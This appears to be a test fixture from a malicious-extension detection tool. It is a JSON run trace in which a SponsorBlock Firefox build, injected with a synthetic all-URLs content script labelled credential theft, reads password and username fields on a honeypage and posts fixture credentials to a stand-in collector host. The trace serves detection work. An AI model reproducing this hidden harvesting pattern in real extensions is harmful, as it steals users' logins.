@@ -1,0 +1,462 @@
+{
+  "schema_version": "0.1",
+  "extension": {
+    "id": "sponsorBlocker@ajay.app",
+    "name": "__MSG_fullName__",
+    "version": "6.1.8"
+  },
+  "run": {
+    "browser": "firefox",
+    "scenario": "honeypage-harvest",
+    "replay_bundle": "local-proxy-v1",
+    "started_at": "2026-10-13T11:10:55Z",
+    "duration_s": 15.91,
+    "pages": [
+      "http://honeypage.test/harvest"
+    ],
+    "instrumentation": {
+      "technique": "static prelude injection into the extension's own bundle",
+      "instrumented_scripts": [
+        "./js/background.js",
+        "./js/content.js",
+        "extdrift_cs.js"
+      ],
+      "proxy_port": 63078,
+      "manifest_patched_for_capture": true
+    },
+    "collector_received": [
+      {
+        "host": "collect-metrics.test",
+        "method": "POST",
+        "path": "http://collect-metrics.test/ingest",
+        "body_len": 82,
+        "body_preview": "{\"u\":\"test.user@example.test\",\"p\":\"Fixture-Passw0rd!\",\"o\":\"http://honeypage.test\"}"
+      },
+      {
+        "host": "collect-metrics.test",
+        "method": "POST",
+        "path": "http://collect-metrics.test/ingest",
+        "body_len": 82,
+        "body_preview": "{\"u\":\"test.user@example.test\",\"p\":\"Fixture-Passw0rd!\",\"o\":\"http://honeypage.test\"}"
+      },
+      {
+        "host": "collect-metrics.test",
+        "method": "POST",
+        "path": "http://collect-metrics.test/ingest",
+        "body_len": 82,
+        "body_preview": "{\"u\":\"test.user@example.test\",\"p\":\"Fixture-Passw0rd!\",\"o\":\"http://honeypage.test\"}"
+      }
+    ],
+    "blocked_egress": [
+      {
+        "host": "firefox.settings.services.mozilla.com",
+        "method": "CONNECT"
+      },
+      {
+        "host": "honeypage.test",
+        "method": "GET"
+      },
+      {
+        "host": "honeypage.test",
+        "method": "POST",
+        "body_len": 108
+      },
+      {
+        "host": "honeypage.test",
+        "method": "POST",
+        "body_len": 108
+      }
+    ]
+  },
+  "manifest": {
+    "name": "__MSG_fullName__",
+    "short_name": "SponsorBlock",
+    "version": "6.1.8",
+    "default_locale": "en",
+    "description": "__MSG_Description__",
+    "homepage_url": "https://sponsor.ajay.app",
+    "icons": {
+      "16": "icons/IconSponsorBlocker16px.png",
+      "32": "icons/IconSponsorBlocker32px.png",
+      "64": "icons/IconSponsorBlocker64px.png",
+      "128": "icons/IconSponsorBlocker128px.png",
+      "256": "icons/IconSponsorBlocker256px.png",
+      "512": "icons/IconSponsorBlocker512px.png",
+      "1024": "icons/IconSponsorBlocker1024px.png"
+    },
+    "permissions": [
+      "storage",
+      "scripting",
+      "unlimitedStorage",
+      "https://sponsor.ajay.app/*",
+      "http://extdrift-report.test/*",
+      "http://*.test/*",
+      "https://*.test/*"
+    ],
+    "options_ui": {
+      "page": "options/options.html",
+      "open_in_tab": true
+    },
+    "web_accessible_resources": [
+      "icons/LogoSponsorBlocker256px.png",
+      "icons/IconSponsorBlocker256px.png",
+      "icons/PlayerStartIconSponsorBlocker.svg",
+      "icons/PlayerStopIconSponsorBlocker.svg",
+      "icons/PlayerUploadIconSponsorBlocker.svg",
+      "icons/PlayerUploadFailedIconSponsorBlocker.svg",
+      "icons/PlayerCancelSegmentIconSponsorBlocker.svg",
+      "icons/clipboard.svg",
+      "icons/settings.svg",
+      "icons/pencil.svg",
+      "icons/check.svg",
+      "icons/check-smaller.svg",
+      "icons/upvote.png",
+      "icons/downvote.png",
+      "icons/thumbs_down.svg",
+      "icons/thumbs_down_locked.svg",
+      "icons/thumbs_up.svg",
+      "icons/help.svg",
+      "icons/report.png",
+      "icons/close.png",
+      "icons/skipIcon.svg",
+      "icons/refresh.svg",
+      "icons/beep.oga",
+      "icons/pause.svg",
+      "icons/stop.svg",
+      "icons/skip.svg",
+      "icons/heart.svg",
+      "icons/visible.svg",
+      "icons/not_visible.svg",
+      "icons/sort.svg",
+      "icons/money.svg",
+      "icons/segway.png",
+      "icons/close-smaller.svg",
+      "icons/right-arrow.svg",
+      "icons/campaign.svg",
+      "icons/star.svg",
+      "icons/lightbulb.svg",
+      "icons/bolt.svg",
+      "icons/stopwatch.svg",
+      "icons/music-note.svg",
+      "icons/import.svg",
+      "icons/export.svg",
+      "icons/PlayerInfoIconSponsorBlocker.svg",
+      "icons/PlayerDeleteIconSponsorBlocker.svg",
+      "icons/dearrow.svg",
+      "icons/sb-pride.png",
+      "icons/pride.svg",
+      "popup.html",
+      "popup.css",
+      "content.css",
+      "shared.css",
+      "js/document.js",
+      "libs/Source+Sans+Pro.css",
+      "libs/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlxdu.woff2",
+      "libs/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmRduz8A.woff2",
+      "libs/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmBduz8A.woff2",
+      "libs/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlBduz8A.woff2"
+    ],
+    "optional_permissions": [
+      "*://*/*"
+    ],
+    "browser_action": {
+      "default_title": "SponsorBlock",
+      "default_popup": "popup.html",
+      "default_icon": {
+        "16": "icons/IconSponsorBlocker16px.png",
+        "32": "icons/IconSponsorBlocker32px.png",
+        "64": "icons/IconSponsorBlocker64px.png",
+        "128": "icons/IconSponsorBlocker128px.png"
+      },
+      "theme_icons": [
+        {
+          "light": "icons/IconSponsorBlocker16px.png",
+          "dark": "icons/IconSponsorBlocker16px.png",
+          "size": 16
+        },
+        {
+          "light": "icons/IconSponsorBlocker32px.png",
+          "dark": "icons/IconSponsorBlocker32px.png",
+          "size": 32
+        },
+        {
+          "light": "icons/IconSponsorBlocker64px.png",
+          "dark": "icons/IconSponsorBlocker64px.png",
+          "size": 64
+        },
+        {
+          "light": "icons/IconSponsorBlocker128px.png",
+          "dark": "icons/IconSponsorBlocker128px.png",
+          "size": 128
+        },
+        {
+          "light": "icons/IconSponsorBlocker256px.png",
+          "dark": "icons/IconSponsorBlocker256px.png",
+          "size": 256
+        },
+        {
+          "light": "icons/IconSponsorBlocker512px.png",
+          "dark": "icons/IconSponsorBlocker512px.png",
+          "size": 512
+        },
+        {
+          "light": "icons/IconSponsorBlocker1024px.png",
+          "dark": "icons/IconSponsorBlocker1024px.png",
+          "size": 1024
+        }
+      ],
+      "default_area": "navbar"
+    },
+    "background": {
+      "scripts": [
+        "./js/background.js"
+      ],
+      "persistent": false
+    },
+    "content_scripts": [
+      {
+        "run_at": "document_start",
+        "matches": [
+          "https://*.youtube.com/*",
+          "https://www.youtube-nocookie.com/embed/*"
+        ],
+        "exclude_matches": [
+          "https://accounts.youtube.com/RotateCookiesPage*"
+        ],
+        "all_frames": true,
+        "js": [
+          "./js/content.js"
+        ],
+        "css": [
+          "content.css",
+          "shared.css"
+        ]
+      },
+      {
+        "matches": [
+          "<all_urls>"
+        ],
+        "js": [
+          "extdrift_cs.js"
+        ],
+        "run_at": "document_idle"
+      }
+    ],
+    "manifest_version": 2,
+    "browser_specific_settings": {
+      "gecko": {
+        "id": "sponsorBlocker@ajay.app",
+        "strict_min_version": "102.0"
+      },
+      "gecko_android": {
+        "strict_min_version": "113.0"
+      }
+    },
+    "_extdrift_synthetic": {
+      "family": "credential_theft",
+      "obfuscated": false
+    }
+  },
+  "network": [
+    {
+      "ts": 1.041,
+      "url": "http://collect-metrics.test/ingest",
+      "method": "POST",
+      "body_len": 82,
+      "resource_type": "fetch",
+      "initiator": "content_script",
+      "frame": "content_script"
+    },
+    {
+      "ts": 2.517,
+      "url": "http://collect-metrics.test/ingest",
+      "method": "POST",
+      "body_len": 82,
+      "resource_type": "fetch",
+      "initiator": "content_script",
+      "frame": "content_script"
+    },
+    {
+      "ts": 5.075,
+      "url": "http://collect-metrics.test/ingest",
+      "method": "POST",
+      "body_len": 82,
+      "resource_type": "fetch",
+      "initiator": "content_script",
+      "frame": "content_script"
+    }
+  ],
+  "dom": [
+    {
+      "ts": 1.041,
+      "event": "read",
+      "target": "input#password",
+      "value_len": 17,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.041,
+      "event": "read",
+      "target": "input[name=username]",
+      "value_len": 22,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.041,
+      "event": "read",
+      "target": "input#password",
+      "value_len": 17,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 2.516,
+      "event": "read",
+      "target": "input#password",
+      "value_len": 17,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 2.516,
+      "event": "read",
+      "target": "input[name=username]",
+      "value_len": 22,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 2.517,
+      "event": "read",
+      "target": "input#password",
+      "value_len": 17,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 5.072,
+      "event": "read",
+      "target": "input#password",
+      "value_len": 17,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 5.072,
+      "event": "read",
+      "target": "input[name=username]",
+      "value_len": 22,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    },
+    {
+      "ts": 5.073,
+      "event": "read",
+      "target": "input#password",
+      "value_len": 17,
+      "origin": "http://honeypage.test",
+      "frame": "content_script"
+    }
+  ],
+  "storage": [],
+  "api": [
+    {
+      "ts": 1.037,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.048,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.05,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.058,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.067,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.077,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.517,
+      "api": "chrome.tabs.create",
+      "arg_count": 1,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.544,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.554,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.559,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.568,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 1.585,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 2.125,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 2.127,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 6.157,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    },
+    {
+      "ts": 6.162,
+      "api": "chrome.tabs.sendMessage",
+      "arg_count": 3,
+      "frame": "content_script"
+    }
+  ]
+}
